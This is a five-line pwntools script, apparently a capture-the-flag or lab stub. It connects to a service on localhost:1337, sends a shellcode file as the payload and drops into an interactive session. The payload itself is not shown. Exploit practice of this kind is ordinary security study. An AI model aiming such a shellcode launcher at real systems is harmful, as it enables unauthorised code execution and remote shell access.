from pwn import *

p = remote('localhost', 1337)
p.send(open('shellcode', 'rb').read())
p.interactive()
